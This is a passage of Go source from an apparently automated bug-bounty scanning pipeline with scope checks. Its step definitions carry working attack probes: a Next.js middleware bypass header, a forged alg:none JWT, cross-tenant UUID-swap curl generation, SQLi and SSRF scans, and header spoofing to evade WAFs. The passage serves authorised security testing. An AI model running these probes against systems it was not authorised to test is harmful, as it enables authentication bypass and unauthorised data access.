		{"ssrf_targets", fmt.Sprintf(`%s . all_urls_200.txt > ssrf_targets_filtered.txt
{ gf ssrf ssrf_targets_filtered.txt; grep -Ei "url=|uri=|path=|dest=|redirect=|callback=|webhook=|src=|fetch=|proxy=|target=" ssrf_targets_filtered.txt; } | sort -u > ssrf_targets.txt
exit 0`, filterTestableRef), "filter-testable", "grep", []string{"scope_filter"}, 0},
		{"ssrf_scan", fmt.Sprintf(`%s
: > ssrf_targets_oob.txt
: > ssrf_vulnerabilities.txt
if [ -n "$RFUF_OOB_URL" ]; then
  sed "s|FOOBAR|$RFUF_OOB_URL|g" ssrf_targets.txt > ssrf_targets_oob.txt
  nuclei -l ssrf_targets_oob.txt -tags ssrf %s "${AUTH_HEADERS[@]}" -o ssrf_vulnerabilities.txt -var oob_url=$RFUF_OOB_URL
else
  nuclei -l ssrf_targets.txt -tags ssrf %s "${AUTH_HEADERS[@]}" -o ssrf_vulnerabilities.txt
fi
exit 0`, authSnip, nucleiOptimized, nucleiOptimized), "nuclei", "grep", []string{"ssrf_targets"}, 0},
		{"redirect_targets", fmt.Sprintf(`%s . all_urls_200.txt > redirect_targets_filtered.txt
gf redirect redirect_targets_filtered.txt | sort -u | head -n %d > redirect_targets.txt
exit 0`, filterTestableRef, maxScanTargets), "filter-testable", "grep", []string{"scope_filter"}, 0},
		{"redirect_scan", fmt.Sprintf("%s\nnuclei -l redirect_targets.txt -tags redirect %s \"${AUTH_HEADERS[@]}\" -o open_redirect_results.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"redirect_targets"}, 0},
		{"lfi_targets", fmt.Sprintf(`%s . all_urls_200.txt > lfi_targets_filtered.txt
gf lfi lfi_targets_filtered.txt > lfi_targets.txt
sort -u lfi_targets.txt -o lfi_targets.txt
exit 0`, filterTestableRef), "filter-testable", "grep", []string{"scope_filter"}, 0},
		{"lfi_scan", fmt.Sprintf("%s\nnuclei -l lfi_targets.txt -tags lfi %s \"${AUTH_HEADERS[@]}\" -o lfi_results.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"lfi_targets"}, 0},
		{"cors_check", `set +e
head -n 500 alive.txt | xargs -P 20 -I{} sh -c '
  ORIGIN="https://evil.com"
  RESP=$(curl -sk --max-time 5 --connect-timeout 3 -H "Origin: $ORIGIN" -H "Access-Control-Request-Credentials: true" -I "{}" 2>/dev/null)
  ACAO=$(echo "$RESP" | grep -i "^access-control-allow-origin:" | tr -d "\r" | awk "{print \$2}")
  ACAC=$(echo "$RESP" | grep -i "^access-control-allow-credentials:" | tr -d "\r" | awk "{print \$2}")
  if [ -n "$ACAO" ] && [ "$ACAO" != "$ORIGIN" ]; then
    if [ "$ACAO" = "*" ] || [ "$ACAO" = "null" ]; then
      [ "$ACAC" = "true" ] && echo "[VULN] {}  ACAO=$ACAO ACAC=$ACAC (credentialed)"
    fi
  elif [ "$ACAO" = "$ORIGIN" ]; then
    [ "$ACAC" = "true" ] && echo "[VULN] {}  ACAO=REFLECTED ACAC=$ACAC (credentialed exfil)"
  fi
' 2>/dev/null > cors_findings.txt
exit 0`, "curl", "grep", []string{"httpx_probe"}, 0},
		{"dirbrute_ffuf", fmt.Sprintf(`mkdir -p ffuf_results
if [ -n "%s" ] && [ -s alive.txt ]; then
  ffuf -w alive.txt:HOST -w %s:WORD -u "HOST/WORD" -e .bak,.old,.swp,.zip,.sql,.git/config -mc 200,201,204,301,302,307,308,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_results/all.json -of json -s
  jq -r ".results[]? | .url" ffuf_results/all.json 2>/dev/null >> ffuf_dirs_raw.txt
  sort -u ffuf_dirs_raw.txt -o ffuf_dirs_raw.txt
fi
exit 0`, wordlist, wordlist), "ffuf", "default", []string{"httpx_probe"}, 0},
		{"dirbrute_verify_200", "if [ -s ffuf_dirs_raw.txt ]; then httpx -l ffuf_dirs_raw.txt -silent -status-code -mc 200 -o ffuf_dirs_200.txt; else : > ffuf_dirs_200.txt; fi", "httpx", "grep", []string{"dirbrute_ffuf"}, 0},
		{"js_endpoints_scan", fmt.Sprintf("%s\nnuclei -l js_endpoints.txt -tags exposure,token-spray,misconfig %s \"${AUTH_HEADERS[@]}\" -o js_endpoint_findings.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"merge_js_endpoints"}, 0},
		{"nextjs_plaid_jwt_probe", `set +e
: > nextjs_plaid_jwt_findings.txt

# Detect Next.js hosts from tech_fingerprint.txt or _next URL prefix
NEXTJS_HOSTS=$( (grep -E "nextjs," tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; grep -hE "/_next/" all_urls.txt 2>/dev/null | sed 's|/.*||' | sort -u) | sort -u)

while read HOST; do
  [ -z "$HOST" ] && continue
  echo "=== $HOST ===" >> nextjs_//plaid_jwt_findings.txt

  # 1. Next.js middleware bypass (CVE-2025-29927). The bypass header is
  #    x-middleware-subrequest with the value 'middleware:middleware:middleware:middleware:middleware'.
  #    We probe both a likely-auth-protected path and the index.
  for PATH in /dashboard /api /admin /settings /account /internal /me /api/user; do
    BASELINE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
    BYPASS=$(curl -sk --max-time 6 -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
    if [ "$BASELINE" != "$BYPASS" ] && [ "$BYPASS" = "200" ] && [ "$BASELINE" != "200" ]; then
      echo "[CRITICAL] $HOST$PATH — Next.js middleware bypass: baseline=$BASELINE bypass=$BYPASS" >> nextjs_plaid_jwt_findings.txt
    fi
  done

	  # 2. Plaid endpoint probe. The Plaid Link flow exposes these paths.
  for ENDPOINT in /plaid/link/token/create /plaid/exchange_public_token /api/plaid/link/token/create /api/plaid/exchange_public_token /plaid_link_token /api/plaid_link_token /auth/refresh-token /api/auth/refresh-token /auth/refresh_token /api/auth/refresh_token /exchange_plaid_token /api/exchange_plaid_token; do
    CODE=$(curl -sk --max-time 6 -X POST -H "Content-Type: application/json" -d '{}' -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
    if [ "$CODE" = "200" ]; then
      echo "[HIGH] $HOST$ENDPOINT — Plaid/auth-token endpoint returns 200 unauthenticated" >> nextjs_plaid_jwt_findings.txt
    fi
  done

  # 3. JWT alg:none. Forge a header.alg=none token with empty signature.
  JWT_NONE='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'
  for ENDPOINT in /api/me /api/user /api/admin /api/v1/me /api/v2/me /api/v3/me /account /me; do
    CODE=$(curl -sk --max-time 6 -H "Authorization: Bearer $JWT_NONE" -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
    case "$CODE" in
      200) echo "[CRITICAL] $HOST$ENDPOINT — JWT alg:none accepted (200)" >> nextjs_plaid_jwt_findings.txt ;;
    esac
  done

  # 4. Next.js source-map leak
  SAMPLE_JS=$(curl -sk --max-time 6 "$HOST" 2>/dev/null | grep -oE '/_next/static/chunks/[^"]+\.js' | head -1)
  if [ -n "$SAMPLE_JS" ]; then
    CODE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST${SAMPLE_JS}.map" 2>/dev/null)
    [ "$CODE" = "200" ] && echo "[MEDIUM] $HOST${SAMPLE_JS}.map — Next.js source map exposed" >> nextjs_plaid_jwt_findings.txt
  fi
done <<< "$NEXTJS_HOSTS"
exit 0`, "curl", "grep", []string{"httpx_probe"}, 0},
		{"drf_probe", `set +e
: > drf_findings.txt
: > drf_idor_targets.txt

# Detect DRF hosts: the browsable API footer is near-unique to DRF.
DRF_HOSTS=$( (grep -E "django|drf|djangorest" tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; curl -sk --max-time 8 "$(head -1 alive.txt 2>/dev/null)/api/v3/" 2>/dev/null | grep -q "Django REST framework" && echo "") | grep -v '^$' | sort -u )

# Broaden detection: any alive host whose /api/v3/ (or /api/ /api/v1/ /api/v2/)
# JSON response carries DRF's signature pagination/links keys, or whose
# OPTIONS response mentions DRF.
while read HOST; do
  [ -z "$HOST" ] && continue
  echo "$DRF_HOSTS" | grep -qxF "$HOST" && continue
  for PREFIX in /api/v3/ /api/v2/ /api/v1/ /api/; do
    # DRF fingerprint: browsable-API footer (HTML) or the DRF pagination +
    # response-envelope JSON shapes ("next":..., "previous":..., "results":[,
    # "detail": "Not found.") on a JSON response. A bare "drf" substring is
    # dropped — it FP'd on unrelated tokens.
    BODY=$(curl -sk --max-time 8 "$HOST$PREFIX" 2>/dev/null | head -c 30000)
    if echo "$BODY" | grep -qiE "Django REST framework|rest_framework|\"next\"\s*:\s*\"https?://|\"detail\"\s*:\s*\"Not found|Not found."; then
      echo "$HOST  django-rest-framework," >> drf_findings.txt
      continue 2
    fi
  done
done < alive.txt
sort -u drf_findings.txt -o drf_findings.txt 2>/dev/null

# Enumerate IDOR-prone detail endpoints under /api/vN/ on DRF hosts.
# List endpoints discovered in all_urls.txt that look like collection roots
# (no trailing id) are recorded; the hunter tests ID-swaps manually.
awk '/\/api\/v[0-9]+\// {print}' all_urls.txt 2>/dev/null \
  | grep -Ei '/(accounts|users|profiles|orders|invoices|payments|cards|loans|holdings|transactions|events|companies|merchants)/' \
  | sort -u | head -n 1000 > drf_idor_targets.txt
exit 0`, "curl", "grep", []string{"httpx_probe", "merge_all_urls"}, 0},
		{"bola_surface_run", `set +e
: > bola_targets.txt
: > bola_curl.txt
: > bola_permutations.txt
# Match UUIDs in URLs like ?company=<uuid> or /<uuid>/. Capture host, path, param, value.
grep -oE 'https?://[^ ?&]+\?[a-z_]+=[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}' all_urls.txt 2>/dev/null \
  | while read -r LINE; do
    URL="${LINE%%\?*}"
    QS="${LINE#*\?}"
    PARAM=$(echo "$QS" | cut -d= -f1)
    UUID=$(echo "$QS" | cut -d= -f2)
    [ -z "$UUID" ] && continue
    echo "$URL	$PARAM	$UUID" >> bola_targets.txt
    # Build ready-to-curl commands: original + 5 adjacent UUIDs (flip last hex digit)
    ADJ=$(echo "$UUID" | sed 's/.$/1/' ; echo "$UUID" | sed 's/.$/2/' ; echo "$UUID" | sed 's/.$/3/' ; echo "$UUID" | sed 's/.$/a/' ; echo "$UUID" | sed 's/.$/f/')
    echo "# $URL?$PARAM=$UUID" >> bola_curl.txt
    while read -r NEW_UUID; do
      echo "curl -sk --max-time 10 \"$URL?$PARAM=$NEW_UUID\" -o /dev/null -w \"  $NEW_UUID -> %{http_code} %{size_download}B\\n\"" >> bola_curl.txt
    done <<< "$ADJ"
    echo "" >> bola_curl.txt
  done
sort -u bola_targets.txt -o bola_targets.txt 2>/dev/null

# === Subdomain-aware UUID permutations ===
# A UUID seen on host-A with param P should also be tested on every OTHER
# host that accepts the same param P. If the API validates ownership per-
# company rather than per-session, passing host-B's UUID to host-A's endpoint
# (or vice versa) is the classic cross-tenant BOLA test. Permutations are
# bounded: at most 3 foreign UUIDs per (param, host) pair to keep the curl
# list runnable.
TMP=$(mktemp -d)
while IFS="$(printf '\t')" read -r URL PARAM UUID; do
  echo "$UUID" >> "$TMP/p_$PARAM"
done < bola_targets.txt
while IFS="$(printf '\t')" read -r URL PARAM UUID; do
  OTHERS=$(grep -vxF "$UUID" "$TMP/p_$PARAM" 2>/dev/null | shuf -n 3)
  [ -z "$OTHERS" ] && continue
  echo "# cross-tenant: $URL?$PARAM=<foreign-uuid> (original uuid=$UUID)" >> bola_permutations.txt
  echo "$OTHERS" | while read -r FOREIGN; do
    echo "curl -sk --max-time 10 \"$URL?$PARAM=$FOREIGN\" -o /dev/null -w \"  foreign=$FOREIGN -> %{http_code} %{size_download}B\\n\"" >> bola_permutations.txt
  done
  echo "" >> bola_permutations.txt
done < bola_targets.txt
rm -rf "$TMP"
sort -u bola_permutations.txt -o bola_permutations.txt 2>/dev/null
exit 0`, "grep", "grep", []string{"merge_all_urls"}, 0},
		{"manual_review_queue", `grep -Ei '/(checkout|cart|payment|invoice|order|orders|subscription|seat|fare|booking|reservation|refund|transfer|withdraw|claim|gift|promo|redeem|upgrade|tier|billing|coupon|voucher|wallet|balance|tax|currency)[/?&=_]' all_urls.txt \
  | grep -Ev '\.(eot|woff2?|ttf|svg|otf|png|jpe?g|gif|ico|css|js|pdf|map|mp[34])([?#]|$)' \
  | sort -u > manual_business_logic_review.txt
exit 0`, "grep", "grep", []string{"merge_all_urls"}, 0},
		{"waf_detect", "if command -v wafw00f >/dev/null 2>&1; then head -n 200 alive.txt > waf_targets_tmp.txt; wafw00f -i waf_targets_tmp.txt -o waf_detections.txt; else : > waf_targets_tmp.txt : > waf_detections.txt; fi", "wafw00f", "grep", []string{"httpx_probe"}, 0},
		{"port_scan_naabu", "if command -v naabu >/dev/null 2>&1; then naabu -list alive.txt -top-ports 1000 -rate 1000 -silent -o naabu_ports.txt; else : > naabu_ports.txt; fi", "naabu", "grep", []string{"httpx_probe"}, 0},
		{"hidden_params_arjun", "if command -v arjun >/dev/null 2>&1 && [ -s alive.txt ]; then head -n 100 alive.txt > arjun_targets_tmp.txt; arjun -i arjun_targets_tmp.txt -oT hidden_params.txt -t 10 --rate-limit 10; rm -f arjun_targets_tmp.txt; else : > hidden_params.txt; fi", "arjun", "grep", []string{"httpx_probe"}, 0},
		{"ghauri_sqli", "if command -v ghauri >/dev/null 2>&1; then { head -n 200 sqli_targets.txt; grep -Ei '[?&](id|uid|order|product|category|page|article|comment|msg)=' sqli_targets.txt; } | sort -u | head -n 100 > ghauri_targets.txt; [ -s ghauri_targets.txt ] && ghauri -m ghauri_targets.txt --batch --level=2 --risk=1 --technique=BT -o ghauri_results.txt; else : > ghauri_results.txt; fi", "ghauri", "grep", []string{"sqli_targets_replace"}, 0},
		{"reflection_run", fmt.Sprintf("%s reflection . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"scope_filter"}, 0},
		{"paramshape_run", fmt.Sprintf("%s paramshape . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"authshape_run", fmt.Sprintf("%s authshape . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"signup_takeover_run", fmt.Sprintf("%s signup . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"idor_surface_run", fmt.Sprintf("%s idor . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
		{"oauth_audit_run", fmt.Sprintf("%s oauth . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"race_scan", fmt.Sprintf("%s race . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
		{"bucket_guess_run", fmt.Sprintf("%s buckets . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"tech_fingerprint"}, 0},
		{"takeover_v2_run", fmt.Sprintf("%s takeoversvc . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"js_mine_run", fmt.Sprintf("%s jsmine . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"jsmap_scrape"}, 0},
		{"secheaders_run", fmt.Sprintf("%s secheaders . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"backupscan_run", fmt.Sprintf("%s backupscan . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"tech_fingerprint"}, 0},
		{"businesslogic_run", fmt.Sprintf("%s businesslogic . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"merge_all_urls"}, 0},
		{"hostheader_run", fmt.Sprintf("%s hostheader . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"cors2_run", fmt.Sprintf("%s cors2 . \nexit 0", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
		{"nuclei_rfuf_pass", fmt.Sprintf(`if [ -n "%s" ] && [ -d "%s" ]; then
		  nuclei -l nuclei_targets.txt -t "%s" %s "${AUTH_HEADERS[@]}" -o nuclei_rfuf_pass.txt
		else
		  echo "[!] nuclei-templates-rfuf overlay not found — skipping custom template pass"
		  : > nuclei_rfuf_pass.txt
		fi
		exit 0`, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, paths.NucleiTemplatesRfuf, nucleiOptimized), "nuclei", "grep", []string{"nuclei_target_merge"}, 0},
		{"env_secrets_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner envsecrets .", authSnip), "findings-runner", "default", []string{"dirbrute_ffuf"}, 0},
		{"git_exposure_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner gitexposure .", authSnip), "findings-runner", "default", []string{"env_secrets_run"}, 0},
		{"paramsprayer_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner paramsprayer .", authSnip), "findings-runner", "default", []string{"url_filter_alive"}, 0},
		{"api_version_gen", fmt.Sprintf("%s\ngo run ./cmd/findings-runner apiversion .", authSnip), "findings-runner", "default", []string{"merge_all_urls"}, 0},
		{"nextjs_bypass_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner nextjsbypass .", authSnip), "findings-runner", "default", []string{"url_filter_alive"}, 0},
		{"s3_audit_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner s3auditor .", authSnip), "findings-runner", "default", []string{"httpx_probe"}, 0},
		{"idor_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner idor .", authSnip), "findings-runner", "default", []string{"merge_all_urls"}, 0},
	}
}

func Run(domain string, resume bool, paths *config.Paths, stepTimeout time.Duration) error {
	parsed, err := scope.Parse(domain)
	if err != nil {
		return err
	}
	return RunForScope(parsed, resume, paths, stepTimeout)
}

func validateResumeScope(workDir string, expected scope.Scope) error {
	data, err := os.ReadFile(filepath.Join(workDir, "scope.json"))
	if err != nil {
		return fmt.Errorf("cannot resume: scope metadata is missing; rerun without -resume to establish %s mode", expected.Mode)
	}
	var recorded struct {
		Input      string     `json:"input"`
		RootDomain string     `json:"root_domain"`
		Mode       scope.Mode `json:"mode"`
	}
	if err := json.Unmarshal(data, &recorded); err != nil {
		return fmt.Errorf("cannot resume: invalid scope.json: %w", err)
	}
	if recorded.RootDomain != expected.RootDomain || recorded.Mode != expected.Mode {
		return fmt.Errorf("cannot resume: existing scan is %s mode for %s, but this command requested %s mode for %s", recorded.Mode, recorded.RootDomain, expected.Mode, expected.RootDomain)
	}
	return nil
}

func applyWafStealth(paths *config.Paths) bool {
	wafFile := filepath.Join(paths.WorkDir, "waf_detections.txt")
	data, err := os.ReadFile(wafFile)
	if err != nil || len(strings.TrimSpace(string(data))) == 0 {
		return false
	}

	executor.AuthEnv["RFUF_USER_AGENT"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	executor.AuthEnv["RFUF_STEALTH_HEADERS"] = "-H \"X-Forwarded-For: 127.0.0.1\" -H \"X-Real-IP: 127.0.0.1\""
	return true
}

func RunForScope(scanScope scope.Scope, resume bool, paths *config.Paths, stepTimeout time.Duration) error {
	domain := scanScope.RootDomain
	cp, err := checkpoint.Load(paths.WorkDir, domain)
	if err != nil {
		return err
	}
	if resume {
		if err := validateResumeScope(paths.WorkDir, scanScope); err != nil {
			return err
		}
	}

	startTime := cp.StartedAt
	if !resume {
		if len(cp.CompletedSteps) > 0 {
			if err := cp.Reset(); err != nil {
				return fmt.Errorf("failed to reset checkpoint: %w", err)
			}
		}
		if err := os.RemoveAll(filepath.Join(paths.WorkDir, ".rfuf", "stages")); err != nil {
			return fmt.Errorf("failed to reset stage records: %w", err)
		}
		startTime = cp.StartedAt
	}

	logFile, err := executor.GetLogFile(paths.WorkDir)
	if err != nil {
		return err
	}
	defer logFile.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n[!] Received interrupt signal. Cleaning up and exiting...")
		cancel()
	}()

	steps := GetStepsForScope(scanScope, paths)
	stepMap := make(map[string]Step)
	for _, s := range steps {
		stepMap[s.ID] = s
	}

	stepIDs := make([]string, len(steps))
	for i, s := range steps {
		stepIDs[i] = s.ID
	}

	completed := make(map[string]bool)
	running := make(map[string]bool)
	var mu sync.Mutex

	maxConcurrent := 5
	if applyWafStealth(paths) {
		maxConcurrent = 2
	}
	semaphore := make(chan struct{}, maxConcurrent)

	records, _ := coverage.LoadStageRecords(paths.WorkDir)
	for _, s := range steps {
		if cp.IsCompleted(s.ID) {
			if softStages[s.ID] {
				isBad := false
				for _, r := range records {
					if r.StageID == s.ID && (r.Status == coverage.StatusTimedOut || r.Status == coverage.StatusFailed) {
						isBad = true
						break
					}
				}
				if isBad {
					continue
				}
			}
			completed[s.ID] = true
		}
	}

	cli.StartDashboard()
	defer cli.StopDashboard()

	executor.LineCallback = cli.PushLogLine
	executor.ResetLogThrottle()
	defer func() { executor.LineCallback = nil }()

	fmt.Print("\033[2J\033[H")

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	go func() {
		for {
			select {
			case <-ticker.C:
				uiLock.Lock()
				stats := cli.UpdateStats(paths.WorkDir)
				mu.Lock()
				var activeSteps []string
				for id, isRunning := range running {
					if isRunning {
						activeSteps = append(activeSteps, id)
					}
				}
				cli.DrawDashboard(domain, startTime, stepIDs, completed, strings.Join(activeSteps, ", "), stats)
				mu.Unlock()
				uiLock.Unlock()
			case <-ctx.Done():
				return
			}
		}
	}()

	var wg sync.WaitGroup
	errChan := make(chan error, len(steps))
	stopAndWait := func(runErr error) error {
		cancel()
		wg.Wait()
		cli.StopDashboard()
		executor.LineCallback = nil
		return finalizeRun(domain, paths, cp, steps, startTime, runErr)
	}

	for {
		applyWafStealth(paths)
		mu.Lock()
		if len(completed) == len(steps) {
			mu.Unlock()
			break
		}

		startedAny := false
		for _, s := range steps {
			if completed[s.ID] || running[s.ID] {
				continue
			}

			depsMet := true
			for _, dep := range s.Deps {
				if !completed[dep] {
					depsMet = false
					break
				}
			}

			if depsMet {
				if s.ID == "dirbrute_ffuf" && paths.SeclistsDirWordlist == "" && paths.SeclistsDirWordlistSmall == "" {
					now := time.Now()
					_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: s.ID, Required: stageRequired(s.ID), Dependencies: s.Deps, Status: coverage.StatusSkipped, StartedAt: now, FinishedAt: now, SkipReason: "wordlist_missing"})
					completed[s.ID] = true
					cp.CompleteStep(s.ID)
					continue
				}

					if tool, ok := stepTools[s.ID]; ok {
						if _, err := exec.LookPath(tool); err != nil {
							now := time.Now()
							_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: s.ID, Required: stageRequired(s.ID), Dependencies: s.Deps, Status: coverage.StatusSkipped, StartedAt: now, FinishedAt: now, SkipReason: "tool_missing"})
							completed[s.ID] = true
							cp.CompleteStep(s.ID)
							continue
						}
					}
				running[s.ID] = true
				startedAny = true
				wg.Add(1)
				go func(step Step) {
					defer wg.Done()
					inputs, outputs := stageArtifacts(step)
					started := time.Now()
					_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusRunning, StartedAt: started, InputArtifacts: coverage.MeasureArtifacts(paths.WorkDir, inputs), OutputArtifacts: coverage.MeasureArtifacts(paths.WorkDir, outputs)})
					select {
					case semaphore <- struct{}{}:
					case <-ctx.Done():
						now := time.Now()
						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusBlocked, StartedAt: started, FinishedAt: now, SkipReason: "cancelled_before_start"})
						return
					}
					defer func() { <-semaphore }()

					res, err := executor.RunCommand(ctx, step.Command, paths.WorkDir, logFile, effectiveStepTimeout(stepTimeout, step.Timeout))
					if err == nil && res.ExitCode == 0 {
						_, outputs := stageArtifacts(step)
						if materializeErr := ensureZeroResultArtifacts(paths.WorkDir, step.ID, outputs); materializeErr != nil {
							err = materializeErr
						}
					}

					mu.Lock()
					delete(running, step.ID)
					inputMetrics := coverage.MeasureArtifacts(paths.WorkDir, inputs)
					outputMetrics := coverage.MeasureArtifacts(paths.WorkDir, outputs)
					if err != nil {
						now := time.Now()
						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: coverage.StatusFailed, StartedAt: started, FinishedAt: now, ExitCode: -1, Error: err.Error(), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
						mu.Unlock()
						if !strings.Contains(err.Error(), "interrupted") {
							errChan <- fmt.Errorf("step %s failed: %v", step.ID, err)
						}
						return
					}

					success := false
					if step.Type == "grep" {
						if res.ExitCode == 0 || res.ExitCode == 1 {
							success = true
						}
					} else {
						if res.ExitCode == 0 {
							success = true
						}
					}
					status := coverage.StatusCompleted
					missingOutput := false
					for _, metric := range outputMetrics {
						if !metric.Exists {
							missingOutput = true
							break
						}
					}
					emptyInput := coverage.CountMetrics(inputMetrics) == 0
					if res.TimedOut {
						if softStages[step.ID] {
							_, outputs := stageArtifacts(step)
							_ = ensureZeroResultArtifacts(paths.WorkDir, step.ID, outputs)
							outputMetrics = coverage.MeasureArtifacts(paths.WorkDir, outputs)
							status = coverage.StatusCompletedEmpty
							_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
							completed[step.ID] = true
							cp.CompleteStep(step.ID)
							mu.Unlock()
							return
						} else {
							status = coverage.StatusTimedOut
						}
					} else if emptyInput {
						status = coverage.StatusCompletedEmpty
					} else if res.ExitCode != 0 {
						status = coverage.StatusFailed
					} else if missingOutput || coverage.CountMetrics(outputMetrics) == 0 {
						status = coverage.StatusCompletedEmpty
					}

					if status == coverage.StatusCompletedEmpty {
						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
						completed[step.ID] = true
						cp.CompleteStep(step.ID)
						mu.Unlock()
						return
					}

					if !success || res.TimedOut || missingOutput {
						if !res.TimedOut {
							status = coverage.StatusFailed
						}
						now := time.Now()
						_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: now, ExitCode: res.ExitCode, TimedOut: res.TimedOut, Error: fmt.Sprintf("exit_code=%d", res.ExitCode), InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
						mu.Unlock()
						errChan <- fmt.Errorf("step %s incomplete (status=%s exit_code=%d)", step.ID, status, res.ExitCode)
						return
					}

					_ = coverage.WriteStageRecord(paths.WorkDir, coverage.StageRecord{StageID: step.ID, Required: stageRequired(step.ID), Dependencies: step.Deps, Status: status, StartedAt: started, FinishedAt: time.Now(), ExitCode: res.ExitCode, InputArtifacts: inputMetrics, OutputArtifacts: outputMetrics, InputCount: coverage.CountMetrics(inputMetrics), OutputCount: coverage.CountMetrics(outputMetrics)})
					completed[step.ID] = true
					cp.CompleteStep(step.ID)
					mu.Unlock()
				}(s)
			}
		}
		mu.Unlock()

		if !startedAny {
			select {
			case err := <-errChan:
				return stopAndWait(err)
			case <-ctx.Done():
				return stopAndWait(nil)
			case <-time.After(100 * time.Millisecond):
				continue
			}
		}

		select {
		case err := <-errChan:
			return stopAndWait(err)
		case <-ctx.Done():
			return stopAndWait(nil)
		default:
			time.Sleep(100 * time.Millisecond)
		}
	}

	wg.Wait()

	uiLock.Lock()
	stats := cli.UpdateStats(paths.WorkDir)
	cli.DrawDashboard(domain, startTime, stepIDs, completed, "FINISHED", stats)
	uiLock.Unlock()

	executor.LineCallback = nil
	if err := finalizeRun(domain, paths, cp, steps, startTime, nil); err != nil {
		fmt.Printf("\n[!] Pipeline incomplete: %v\nOutput saved to %s\n", err, paths.WorkDir)
		return err
	}

	fmt.Printf("\n[+] Pipeline complete! Output saved to %s\n", paths.WorkDir)
	return nil
}

func stageRequired(stepID string) bool {
	return true
}

func ensureZeroResultArtifacts(workDir, stepID string, outputs []string) error {
	materializeStages := map[string]bool{
		"scope_guard":         true,
		"jsmap_scrape":        true,
		"hidden_params_arjun": true,
		"merge_brute_subs":    true,
		"dirbrute_ffuf":       true,
	}
	if !materializeStages[stepID] {
		return nil
	}
	for _, path := range outputs {
		if filepath.IsAbs(path) || strings.HasPrefix(path, "..") {
			continue
		}
		full := filepath.Join(workDir, path)
		if _, err := os.Stat(full); err == nil {
			continue
		} else if os.IsNotExist(err) {
